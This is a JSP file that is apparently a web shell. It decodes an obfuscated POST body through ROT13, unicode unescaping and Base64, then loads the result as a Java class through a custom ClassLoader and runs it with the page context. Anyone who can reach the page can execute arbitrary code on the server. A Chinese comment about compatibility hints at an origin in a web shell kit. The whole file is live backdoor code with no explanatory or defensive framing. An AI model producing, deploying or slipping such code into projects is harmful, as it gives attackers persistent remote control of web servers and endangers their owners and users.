<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
private byte[] Decrypt(byte[] data) throws Exception {
 String content = new String(data);
 // Reverse ROT13 decryption
 StringBuilder decryptedContent = new StringBuilder();
 for (int i = 0; i < content.length(); i++) {
   char c = content.charAt(i);
   if (c >= 'a' && c <= 'z') {
     c = (char) (((c - 'a') + 13) % 26 + 'a');
   } else if (c >= 'A' && c <= 'Z') {
     c = (char) (((c - 'A') + 13) % 26 + 'A');
   }
   decryptedContent.append(c);
 }
 
 String decodedString = decryptedContent.toString();
 java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
 bos.write(decodedString.getBytes(), 13, decodedString.length() - 43);
 String unicode = new String(bos.toByteArray());
 StringBuilder sb = new StringBuilder();
 int i = -1;
 int pos = 0;
 while ((i = unicode.indexOf("\\u", pos)) != -1) {
   sb.append(unicode.substring(pos, i));
   if (i + 5 < unicode.length()) {
     pos = i + 6;
     sb.append((char) Integer.parseInt(unicode.substring(i + 2, i + 6),
16));
   }
 }
 byte[] decryptedData =
java.util.Base64.getDecoder().decode(sb.toString().replace("<", "+").replace(">",
"/"));
 return decryptedData;
}
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容�??
            out.clear();
            out=pageContext.pushBody();
            */
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>